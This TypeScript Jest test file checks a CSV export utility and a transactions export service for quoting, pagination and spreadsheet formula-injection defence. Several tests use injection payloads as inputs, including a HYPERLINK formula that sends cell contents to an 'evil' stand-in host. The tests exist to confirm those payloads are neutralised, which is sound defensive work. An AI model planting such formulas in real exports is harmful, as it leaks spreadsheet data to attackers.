import { toCsv, toCsvCell, toCsvRow } from './csv.util';
import { TransactionsService } from '../../transactions/transactions.service';

// Only findHistory is exercised (and mocked), so every constructor argument can be inert.
const makeTransactionsService = () =>
  new TransactionsService(...(Array.from({ length: 13 }, () => ({})) as ConstructorParameters<typeof TransactionsService>));

/** A small RFC 4180 parser, so tests prove values round-trip rather than just matching strings. */
function parseCsv(text: string): string[][] {
  const rows: string[][] = [];
  let row: string[] = [];
  let cell = '';
  let quoted = false;
  for (let i = 0; i < text.length; i += 1) {
    const ch = text[i];
    if (quoted) {
      if (ch === '"' && text[i + 1] === '"') { cell += '"'; i += 1; }
      else if (ch === '"') quoted = false;
      else cell += ch;
    } else if (ch === '"') quoted = true;
    else if (ch === ',') { row.push(cell); cell = ''; }
    else if (ch === '\r') { /* handled with \n */ }
    else if (ch === '\n') { row.push(cell); rows.push(row); row = []; cell = ''; }
    else cell += ch;
  }
  if (cell !== '' || row.length) { row.push(cell); rows.push(row); }
  return rows;
}

describe('toCsvCell (#1380)', () => {
  it.each(['=HYPERLINK("https://evil/?"&A1,"Refund")', '+1+1', '-2+3', '@SUM(A1:A9)', '\tcmd', '\rcmd'])(
    'neutralises the formula trigger in %j',
    (value) => {
      const parsed = parseCsv(toCsvCell(value) + '\n')[0][0];
      expect(parsed.startsWith("'")).toBe(true);
      expect(parsed.slice(1)).toBe(value);
    },
  );

  it('does not treat numbers as formulas', () => {
    expect(toCsvCell(-5.25)).toBe('-5.25');
    expect(toCsvCell(100)).toBe('100');
  });

  it('writes dates as ISO strings and null/undefined as empty', () => {
    expect(toCsvCell(new Date('2026-01-02T03:04:05.000Z'))).toBe('2026-01-02T03:04:05.000Z');
    expect(toCsvCell(null)).toBe('');
    expect(toCsvCell(undefined)).toBe('');
    expect(toCsvCell(new Date('nope'))).toBe('');
  });

  it('round-trips quotes, commas and newlines through a CSV parser', () => {
    const tricky = ['ref"x,y', 'two\nlines', 'a,b', 'plain', '"quoted"'];
    const [row] = parseCsv(toCsvRow(tricky) + '\n');
    expect(row).toEqual(tricky);
  });

  it('keeps columns aligned when a value contains a quote', () => {
    const [row] = parseCsv(toCsvRow(['id-1', 'ref"x,y', 42, 'USD']) + '\n');
    expect(row).toEqual(['id-1', 'ref"x,y', '42', 'USD']);
  });
});

describe('toCsv', () => {
  it('joins header and rows with CRLF and ends with a newline', () => {
    expect(toCsv(['a', 'b'], [[1, 'x'], [2, 'y']])).toBe('a,b\r\n1,x\r\n2,y\r\n');
  });
});

describe('TransactionsService.exportTransactionsCsv (#1380)', () => {
  const tx = (i: number, reference = `ref-${i}`) => ({
    id: `tx-${i}`, reference, senderId: 'u1', receiverId: 'u2', amount: 10, currency: 'USD',
    status: 'completed', createdAt: new Date('2026-01-01T00:00:00Z'),
  });

  it('exports every row across pages, not just the first 1000', async () => {
    const all = Array.from({ length: 2_350 }, (_, i) => tx(i));
    const service = makeTransactionsService();
    const pageSize = 100;
    jest.spyOn(service, 'findHistory').mockImplementation(async ({ page = 1, limit = pageSize }) => ({
      items: all.slice((page - 1) * limit, page * limit) as never,
      total: all.length,
      page,
      limit,
    }));

    const parsed = parseCsv(await service.exportTransactionsCsv('u1'));
    expect(parsed).toHaveLength(1 + 2_350);
    expect(parsed[0]).toEqual(['id', 'reference', 'senderId', 'receiverId', 'amount', 'currency', 'status', 'createdAt']);
    expect(parsed[2_350]?.[0]).toBe('tx-2349');
  });

  it('neutralises a malicious reference and keeps a quoted one intact', async () => {
    const service = makeTransactionsService();
    jest.spyOn(service, 'findHistory').mockResolvedValue({
      items: [tx(1, '=HYPERLINK("http://evil/?"&A1,"x")'), tx(2, 'ref"x,y')] as never,
      total: 2, page: 1, limit: 100,
    });

    const parsed = parseCsv(await service.exportTransactionsCsv('u1'));
    expect(parsed[1]?.[1]).toBe(`'=HYPERLINK("http://evil/?"&A1,"x")`);
    expect(parsed[2]?.[1]).toBe('ref"x,y');
    expect(parsed[2]).toHaveLength(8);
  });

  it('stops after a short page without extra requests', async () => {
    const service = makeTransactionsService();
    const spy = jest.spyOn(service, 'findHistory').mockResolvedValue({ items: [tx(1)] as never, total: 1, page: 1, limit: 100 });
    await service.exportTransactionsCsv('u1');
    expect(spy).toHaveBeenCalledTimes(1);
  });
});
